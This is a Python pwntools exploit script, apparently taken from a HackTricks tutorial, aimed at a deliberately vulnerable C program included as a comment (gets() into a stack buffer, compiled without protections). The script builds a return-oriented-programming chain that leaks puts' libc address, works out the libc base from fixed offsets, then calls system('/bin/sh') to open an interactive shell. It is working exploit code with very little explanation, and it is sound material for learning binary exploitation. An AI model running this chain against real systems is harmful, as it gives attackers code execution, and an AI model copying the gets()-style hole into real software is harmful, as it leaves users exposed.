# from https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address

'''
#include <stdio.h>

// gcc -o vuln vuln.c -fno-stack-protector  -no-pie

int main() {

    char buffer[32];
    puts("Simple ROP.\n");
    gets(buffer);

    return 0;
}
'''

from pwn import *

pwn = process("./vuln")
e = ELF("./vuln")
#gdb.attach(pwn)


junk = b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE"
pop_rdi = p64(0x00000000004005f3) # pop rdi; ret
puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.symbols['main']

print("\n")
print("[>] Main start: {}".format(hex(main)))
print("[>] Puts plt: {}".format(hex(puts_plt)))

buf = junk
buf += pop_rdi
buf += p64(puts_got)
buf += p64(puts_plt)
buf += p64(main)

pwn.sendline(buf)

line1 = pwn.recvline()
line2 = pwn.recvline()
leak = pwn.recvline().strip()

leak = u64(leak + b'\x00' * (8 - len(leak)))
print("[>] Puts libc: {}".format(hex(leak)))

offset_puts = 0x6f690
offset_system = 0x45390
offset_bin_sh = 0x18cd57

libc_base = leak - offset_puts

print("[>] libc base: {}".format(hex(libc_base)))

system_libc = libc_base + offset_system
bin_sh_libc = libc_base + offset_bin_sh

print("[>] System libc: {}".format(hex(system_libc)))
print("[>] \"/bin/sh\" libc: {}".format(hex(bin_sh_libc)))

buf2 = junk
buf2 += pop_rdi
buf2 += p64(bin_sh_libc)
buf2 += p64(system_libc)

pwn.sendline(buf2)

pwn.interactive()
